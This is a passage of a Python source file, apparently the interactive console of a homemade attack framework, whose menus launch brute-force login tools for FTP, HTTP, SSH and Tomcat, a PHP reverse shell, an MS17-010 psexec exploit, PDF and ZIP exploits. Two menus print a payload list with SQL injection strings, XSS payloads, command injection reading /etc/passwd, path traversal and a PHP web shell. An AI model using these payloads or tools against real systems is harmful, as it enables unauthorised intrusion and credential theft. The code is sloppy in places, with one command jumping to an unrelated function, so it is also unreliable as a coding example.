USERNAMELIST     | specifiy the username list.
PASSLIST         | specifiy the password list.

you will specifiy these options when you run or exploit it!
""")
        exploitftplogintest()
    elif scconsole14 == "run":
        os.system('python exploits/ftp-login-test.py')
        exploitftplogintest()
    elif scconsole14 == "exploit":
        os.system('python exploits/ftp-login-test.py')
        exploitftplogintest()
    elif scconsole14 == "unuse":
        print("unusing exploit/ftp-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole14 == "exit":
        exit()

def exploithttplogintest():
    scconsole15 = input("sc~" + color.red + "(exploit/http-login-test)" + color.white + ">")
    if scconsole15 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploithttplogintest()
    elif scconsole15 == "clear":
        os.system('clear')
        exploithttplogintest()
    elif scconsole15 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
USERNAMELIST     | specifiy the username list.
PASSLIST         | specifiy the password list.

you will specifiy these options when you run or exploit it!
""")
        exploithttplogintest()
    elif scconsole15 == "run":
        os.system('python exploits/http-login-test.py')
        exploithttplogintest()
    elif scconsole15 == "exploit":
        os.system('python exploits/http-login-test.py')
        exploithttplogintest()
    elif scconsole15 == "unuse":
        print("unusing exploit/http-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole15 == "exit":
        exit()

def exploitreverseshell():
    scconsole16 = input("sc~" + color.red + "(exploit/reverse-shell)" + color.white + ">")
    if scconsole16 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitreverseshell()
    elif scconsole16 == "clear":
        os.system('clear')
        exploitreverseshell()
    elif scconsole16 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy your ip address.
LPORT            | specifiy your port.

you will specifiy these options when you run or exploit it!
""")
        exploitreverseshell()
    elif scconsole16 == "run":
        os.system('php exploits/reverse-shell.php')
        exploitreverseshell()
    elif scconsole16 == "exploit":
        os.system('php exploits/reverse-shell.php')
        exploitreverseshell()
    elif scconsole16 == "unuse":
        print("unusing exploit/reverse-shell.")
        time.sleep(0.5)
        Console()
    elif scconsole16 == "exit":
        exit()

def exploithandlerhandler():
    scconsole17 = input("sc~" + color.red + "(exploit/handler/handler)" + color.white + ">")
    if scconsole17 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploithandlerhandler()
    elif scconsole17 == "clear":
        os.system('clear')
        exploithandlerhandler()
    elif scconsole17 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        exploithandlerhandler()
    elif scconsole17 == "run":
        os.system('python exploits/handler/handler.py')
        exploithandlerhandler()
    elif scconsole17 == "exploit":
        os.system('python exploits/handler/handler.py')
        exploithandlerhandler()
    elif scconsole17 == "unuse":
        print("unusing exploit/handler/handler.")
        time.sleep(0.5)
        Console()
    elif scconsole17 == "exit":
        exit()

def exploithandlerlistining():
    scconsole18 = input("sc~" + color.red + "(exploit/handler/listining)" + color.white + ">")
    if scconsole18 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploithandlerlistining()
    elif scconsole18 == "clear":
        os.system('clear')
        exploithandlerlistining()
    elif scconsole18 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        exploithandlerlistining()
    elif scconsole18 == "run":
        os.system('python exploits/handler/listining.py')
        exploithandlerlistining()
    elif scconsole18 == "exploit":
        os.system('python exploits/handler/listining.py')
        exploithandlerlistining()
    elif scconsole18 == "unuse":
        print("unusing exploit/handler/listining.")
        time.sleep(0.5)
        Console()
    elif scconsole18 == "exit":
        exit()

def wexploitsshlogintest():
    scconsole19 = input("sc~" + color.red + "(windows/ssh-login-test)" + color.white + ">")
    if scconsole19 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitsshlogintest()
    elif scconsole19 == "clear":
        os.system('clear')
        wexploitsshlogintest()
    elif scconsole19 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LHOST         | specifiy the target ip address or url.
LPORT         | specified as 22. (ssh port).
PASSLIST      | specifiy the password list path.
USERNAMELIST  | specifiy the username list path.

you will specifiy these options when you run or exploit it!
""")
        wexploitsshlogintest()
    elif scconsole19 == "run":
        os.system('python exploits/windows/ssh-login-test.py')
        wexploitsshlogintest()
    elif scconsole19 == "exploit":
        os.system('python exploits/windows/ssh-login-test.py')
        wexploitsshlogintest()
    elif scconsole19 == "unuse":
        print("unusing exploit/ssh-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole19 == "exit":
        exit()

def wexploitjavarhino():
    scconsole20 = input("sc~" + color.red + "(windows/java-rhino)" + color.white + ">")
    if scconsole20 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitjavarhino()
    elif scconsole20 == "clear":
        os.system('clear')
        wexploitjavarhino()
    elif scconsole20 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LHOST         | specifiy the target ip address.
LPORT         | specifiy the target port (port 445 needs to open on target).
CMD           | specifiy the cmd command.

you will specifiy these options when you run or exploit it!
""")
        wexploitjavarhino()
    elif scconsole20 == "run":
        os.system('python exploits/windows/java-rhino.py')
        wexploitjavarhino()
    elif scconsole20 == "exploit":
        os.system('python exploits/windows/java-rhino.py')
        wexploitjavarhino()
    elif scconsole20 == "unuse":
        print("unusing windows/java-rhino.")
        time.sleep(0.5)
        Console()
    elif scconsole20 == "exit":
        exit()

def wexploitms17010psexec():
    scconsole21 = input("sc~" + color.red + "(windows/ms17-010-psexec)" + color.white + ">")
    if scconsole21 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitms17010psexec()
    elif scconsole21 == "clear":
        os.system('clear')
        wexploittomcatmgrlogin()
    elif scconsole21 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
USERNAMELIST     | specifiy the username list.
PASSLIST         | specifiy the password list.
CMD              | specifiy the cmd command.

you will specifiy these options when you run or exploit it!
""")
        wexploitms17010psexec()
    elif scconsole21 == "run":
        os.system('python exploits/windows/ms17-010-psexec.py')
        wexploitms17010psexec()
    elif scconsole21 == "exploit":
        os.system('python exploits/windows/ms17-010-psexec.py')
        wexploitms17010psexec()
    elif scconsole21 == "unuse":
        print("unusing windows/ms17-010-psexec.")
        time.sleep(0.5)
        Console()
    elif scconsole21 == "exit":
        exit()

def wexploitPDFexploit():
    scconsole22 = input("sc~" + color.red + "(windows/PDF-exploit)" + color.white + ">")
    if scconsole22 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitPDFexploit()
    elif scconsole22 == "clear":
        os.system('clear')
        wexploitPDFexploit()
    elif scconsole22 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        wexploitPDFexploit()
    elif scconsole22 == "run":
        os.system('python exploits/windows/PDF-exploit.py')
        wexploitPDFexploit()
    elif scconsole22 == "exploit":
        os.system('python exploits/windows/PDF-exploit.py')
        wexploitPDFexploit()
    elif scconsole22 == "unuse":
        print("unusing windows/PDF-exploit.")
        time.sleep(0.5)
        Console()
    elif scconsole22 == "exit":
        exit()

def wexploitftplogintest():
    scconsole23 = input("sc~" + color.red + "(windows/ftp-login-test)" + color.white + ">")
    if scconsole23 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitftplogintest()
    elif scconsole23 == "clear":
        os.system('clear')
        wexploitftplogintest()
    elif scconsole23 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
USERNAMELIST     | specifiy the username list.
PASSLIST         | specifiy the password list.

you will specifiy these options when you run or exploit it!
""")
        wexploitftplogintest()
    elif scconsole23 == "run":
        os.system('python exploits/windows/ftp-login-test.py')
        wexploitftplogintest()
    elif scconsole23 == "exploit":
        os.system('python exploits/windows/ftp-login-test.py')
        wexploitftplogintest()
    elif scconsole23 == "unuse":
        print("unusing windows/ftp-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole23 == "exit":
        exit()

def texploitXSS():
    scconsole24 = input("sc~" + color.red + "(site/XSS)" + color.white + ">")
    if scconsole24 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploitXSS()
    elif scconsole24 == "clear":
        os.system('clear')
        texploitXSS()
    elif scconsole24 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!

this is not exploit, this for try the payload!
payload = <img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.
""")
        texploitXSS()
    elif scconsole24 == "run":
        os.system('firefox exploits/site/XSS.html')
        texploitXSS()
    elif scconsole24 == "exploit":
        os.system('firefox exploits/site/XSS.html')
        texploitXSS()
    elif scconsole24 == "unuse":
        print("unusing site/XSS.")
        time.sleep(0.5)
        Console()
    elif scconsole24 == "exit":
        exit()

def texploitfindvulnerabiliteswebsite():
    scconsole25 = input("sc~" + color.red + "(site/find-vulnerabilites-website)" + color.white + ">")
    if scconsole25 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> to see avalable payloads in sc-framework.
""")
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "clear":
        os.system('clear')
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
PAYLOAD          | specifiy the payload you want.

please copy the payload you want by typing (show payloads)!
you will specifiy these options when you run or exploit it!
""")
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "show payloads":
        print("""
' OR 1=1--   ---> SQL Injection payload.

' UNION SELECT NULL,NULL,NULL--  ---> SQL Injection union payload.

<script>alert('XSS')</script>  ---> cross site XSS alert payload.

<img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.

;whoami  ---> remote code execute whoami payload.

;cat /etc/passwd  ---> remote code execute cat payload.

../../../../etc/passwd  ---> directory traversal etc/passwd payload.

<?php system($_GET['cmd']); ?>  ---> directory traversal php payload.
""")
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "run":
        os.system('python exploits/site/find_vulnerabilites_website.py')
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "exploit":
        os.system('python exploits/site/find_vulnerabilites_website.py')
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "unuse":
        print("unusing site/find_vulnerabilites_website.")
        time.sleep(0.5)
        Console()
    elif scconsole25 == "exit":
        exit()

def texploitfindvulnerabiliteswebsite2():
    scconsole26 = input("sc~" + color.red + "(site/find-vulnerabilites-website2)" + color.white + ">")
    if scconsole26 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> to see avalable payloads in sc-framework.
""")
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "clear":
        os.system('clear')
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
PAYLOAD          | specifiy the payload you want.

please copy the payload you want by typing (show payloads)!
you will specifiy these options when you run or exploit it!
""")
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "show payloads":
        print("""
' OR 1=1--   ---> SQL Injection payload.

' UNION SELECT NULL,NULL,NULL--  ---> SQL Injection union payload.

<script>alert('XSS')</script>  ---> cross site XSS alert payload.

<img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.

;whoami  ---> remote code execute whoami payload.

;cat /etc/passwd  ---> remote code execute cat payload.

../../../../etc/passwd  ---> directory traversal etc/passwd payload.

<?php system($_GET['cmd']); ?>  ---> directory traversal php payload.
""")
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "run":
        os.system('python exploits/site/find-vulnerabilites-website2.py')
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "exploit":
        os.system('python exploits/site/find-vulnerabilites-website2.py')
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "unuse":
        print("unusing site/find-vulnerabilites-website2.")
        time.sleep(0.5)
        Console()
    elif scconsole26 == "exit":
        exit()

def texploithttplogintest():
    scconsole27 = input("sc~" + color.red + "(site/http-login-test)" + color.white + ">")
    if scconsole27 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploithttplogintest()
    elif scconsole27 == "clear":
        os.system('clear')
        texploithttplogintest()
    elif scconsole27 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
USERNAMELIST     | specifiy the username list.
PASSLIST         | specifiy the password list.

you will specifiy these options when you run or exploit it!
""")
        texploithttplogintest()
    elif scconsole27 == "run":
        os.system('python exploits/site/http-login-test.py')
        texploithttplogintest()
    elif scconsole27 == "exploit":
        os.system('python exploits/site/http-login-test.py')
        texploithttplogintest()
    elif scconsole27 == "unuse":
        print("unusing site/http-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole27 == "exit":
        exit()

def texploitZIPexploit():
    scconsole28 = input("sc~" + color.red + "(site/ZIP-exploit)" + color.white + ">")
    if scconsole28 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploitZIPexploit()
    elif scconsole28 == "clear":
        os.system('clear')
        texploitZIPexploit()
    elif scconsole28 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specifiy the target url to upload zip file.

you will specifiy these options when you run or exploit it!
""")
        texploitZIPexploit()
    elif scconsole28 == "run":
        os.system('python exploits/site/ZIP-exploit.py')
        texploitZIPexploit()
    elif scconsole28 == "exploit":
        os.system('python exploits/site/ZIP-exploit.py')
        texploitZIPexploit()
    elif scconsole28 == "unuse":
        print("unusing site/ZIP-exploit.")
        time.sleep(0.5)
        Console()
    elif scconsole28 == "exit":
        exit()

def texploittomcatmgrlogin():
    scconsole29 = input("sc~" + color.red + "(site/tomcat-mgr-login)" + color.white + ">")
    if scconsole29 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploittomcatmgrlogin()
    elif scconsole29 == "clear":
        os.system('clear')
        texploittomcatmgrlogin()
    elif scconsole29 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target url.
USERNAMELIST     | specifiy the username list.
PASSLIST         | specifiy the password list.
BRUTEFORCE-SPEED | specifiy the brute force speed.

you will specifiy these options when you run or exploit it!
""")
        texploittomcatmgrlogin()
    elif scconsole29 == "run":
        os.system('python exploits/site/tomcat-mgr-login.py')
        texploittomcatmgrlogin()
    elif scconsole29 == "exploit":
        os.system('python exploits/site/tomcat-mgr-login.py')
        texploittomcatmgrlogin()
    elif scconsole29 == "unuse":
        print("unusing site/tomcat-mgr-login.")
        time.sleep(0.5)
        Console()
    elif scconsole29 == "exit":
        exit()

def OSconsole():
    scconsole2 = input("sc-" + color.blue + "system" + color.white + "~>")
    os.system(scconsole2)
    if scconsole2 == "back to sc-console":
        Console()




def main():
    start()
    Menu()
    while True:
        Console()


if __name__ == "__main__":
    main()
